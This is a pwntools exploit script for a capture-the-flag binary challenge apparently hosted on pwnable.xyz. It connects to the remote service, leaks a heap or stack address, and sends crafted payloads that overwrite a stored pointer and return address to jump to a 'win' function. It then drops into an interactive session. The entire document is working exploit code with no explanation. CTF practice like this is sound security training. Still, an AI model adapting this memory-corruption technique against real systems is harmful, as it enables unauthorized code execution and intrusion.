from pwn import *

elf = context.binary = ELF('challenge', checksec=False)


#break *0x40085B

gdbscript = """
break *0x40082B
break *0x4008BD
c
"""

# target = process(elf.path)
io=remote('svc.pwnable.xyz',30005)
# target = gdb.debug(elf.path, gdbscript=gdbscript) #
# context.terminal = ["tmux", "splitw", "-h"]
io.recvuntil("> ")
io.sendline("2")
addr = int(io.recvline().strip(), 16)
struct_base_addr = addr - 16
win = 0x400A3E
overw_addr =  addr + 80 # 88

print("leak: ", hex(addr))
print("overw_addr: ", hex(overw_addr))



payload = B"A" * 8
payload += p64(overw_addr)
print(len(payload))
# payload1 = B"A" * 8
# payload1 += p64(addr)

payload2 = p64(win) 
payload2 += p64(struct_base_addr)
payload2 += b'\x00' * 16


io.recvuntil(b"> ")
io.send(b"1")

io.send(payload) # payload

io.recvuntil(b"> ")
io.sendline(b"3") 
  

io.recvuntil(b"> ") #overwriting rip address
io.sendline(b"1")
io.send(payload2)

io.recvuntil("> ")
io.sendline("0")

io.interactive()

